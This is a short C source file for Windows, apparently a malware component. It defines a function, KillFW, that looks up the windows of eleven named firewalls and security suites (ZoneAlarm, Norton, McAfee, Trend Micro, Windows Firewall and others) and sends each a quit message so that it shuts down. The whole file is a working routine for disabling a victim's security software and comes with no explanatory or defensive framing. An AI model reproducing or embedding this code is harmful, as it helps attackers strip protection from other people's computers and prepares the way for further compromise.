#include <windows.h>

void KillFW(void);

void KillFW(void)
{
	char	*FirewallName[] =	{
								" Sygate Personal Firewall Pro",
								"ZoneAlarm Pro",
								"ZoneAlarm Security Suite",
								"Norman Personal Firewall",
								"Norton Personal Firewall",
								"Norton Internet Security",
								"McAfee Personal Firewall Plus",
								"McAfee Internet Security",
								"Trend Micro PC-cillin",
								"Windows Security Center",
								"Windows Firewall"
								};

	for(int i = 0; i < 11; i++)
	{
		PostMessage(FindWindow(0, FirewallName[i]), WM_QUIT, 0, 0);
	}

	return;
}